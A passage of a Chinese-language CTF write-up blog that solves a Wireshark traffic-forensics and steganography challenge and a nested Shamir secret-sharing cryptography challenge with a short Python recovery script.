</span></span></code></pre></div><h2 id=wireshark>Wireshark</h2><p>找 HTTP 流量, 可以找到几张图, 有一张图损坏无法打开, 发现 crc 不对, 修复一下就是秘钥,<br>得到 <code>57pmYyWt</code>, 然而不知道是啥隐写, 最后通过流量记录发现访问过 <code>http://tools.jb51.net/</code>,<br>可以在上面找到一个图片隐写, 把图片都试了一下最后发现那张比较大的图片可以解出 flag,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-
</span></span></code></pre></div><p>把里面的 <code>44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D</code>, 解个 hex 就拿到 flag.</p><h2 id=联盟决策大会>联盟决策大会</h2><p>Shamir 秘密分享方案, 密码学刚学, 在 <a href=https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing>wiki</a> 上有个挺好的脚本,<br>题目相当于用两次 Shamir, 这样就可以让两个组织都到才能解密, 把脚本照着这个思路稍微改一下就能拿到 flag,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>from</span> __future__ <span style=color:#ff79c6>import</span> division
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> __future__ <span style=color:#ff79c6>import</span> print_function
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> random
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> functools
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># 12th Mersenne Prime</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># (for this application we want a known prime number as close as</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># possible to our security level; e.g.  desired security level of 128</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># bits -- too large and all the ciphertext is large; too small and</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># security is compromised)</span>
</span></span><span style=display:flex><span>_PRIME <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># 13th Mersenne Prime is 2**521 - 1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># ... 省略</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>t1 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>1</span>,<span style=color:#bd93f9>0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A</span>)
</span></span><span style=display:flex><span>t2 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>2</span>,<span style=color:#bd93f9>0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7</span>)
</span></span><span style=display:flex><span>t3 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>4</span>,<span style=color:#bd93f9>0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC</span>)
</span></span><span style=display:flex><span>t4 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>3</span>,<span style=color:#bd93f9>0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA</span>)
</span></span><span style=display:flex><span>t5 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>4</span>,<span style=color:#bd93f9>0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9</span>)
</span></span><span style=display:flex><span>t6 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>5</span>,<span style=color:#bd93f9>0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;&#39;&#39;main function&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    shares <span style=color:#ff79c6>=</span> [t1,t2,t3]
</span></span><span style=display:flex><span>    shares2 <span style=color:#ff79c6>=</span> [t4,t5,t6]
</span></span><span style=display:flex><span>    a <span style=color:#ff79c6>=</span> recover_secret(shares)
</span></span><span style=display:flex><span>    b <span style=color:#ff79c6>=</span> recover_secret(shares2)
</span></span><span style=display:flex><span>    t7 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>1</span>, a)
</span></span><span style=display:flex><span>    t8 <span style=color:#ff79c6>=</span> (<span style=color:#bd93f9>2</span>, b)
</span></span><span style=display:flex><span>    c <span style=color:#ff79c6>=</span> recover_secret([t7, t8])
</span></span><span style=display:flex><span>    c <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>hex</span>(c)[<span style=color:#bd93f9>2</span>:]
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span>(c)
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#8be9fd;font-style:italic>bytes</span><span style=color:#ff79c6>.</span>fromhex(c))
</span></span><span style=display:flex><span>    <span style=color:#6272a4>#shares = []</span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>#a = recover_secret(shares)</span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>#print(a)</span>
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/writeup>writeup</a></li><li><a href=/tags/ddctf>ddctf</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>